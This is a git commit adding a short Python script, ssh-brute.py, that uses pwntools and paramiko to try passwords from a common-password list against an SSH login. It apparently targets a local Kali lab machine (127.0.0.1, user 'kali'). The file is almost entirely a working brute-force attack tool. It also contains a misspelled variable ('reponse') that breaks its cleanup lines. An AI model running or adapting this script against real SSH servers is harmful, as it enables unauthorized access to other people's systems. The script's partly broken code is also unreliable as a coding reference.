f908c45dc18c01edd61ea50cff9a5839abcb4b81
Scott <83973350+shprojectsforshow@users.noreply.github.com>
2024-04-10 15:11:57 -0500

    Add files via upload

---
+++ ssh-brute.py
@@ -0,0 +1,21 @@
+from pwn import *
+import paramiko
+
+host= "127.0.0.1"
+username= "kali"
+attempts= 0
+
+with open("ssh-common-passwords.txt","r") as password_list:
+	for password in password_list:
+		password=password.strip("\n")
+		try:
+			print("[{}] Attempting password: '{}'!".format(attempts,password))
+			response = ssh(host=host,  user=username, password=password, timeout=1)
+			if response.connected():
+				print("[>] Valid password found: '{}'!".format(password))
+				reponse.close()
+				break
+			reponse.close()
+		except paramiko.ssh_exception.AuthenticationException:
+			print("[X] Invalid Password!")
+		attempts +=1
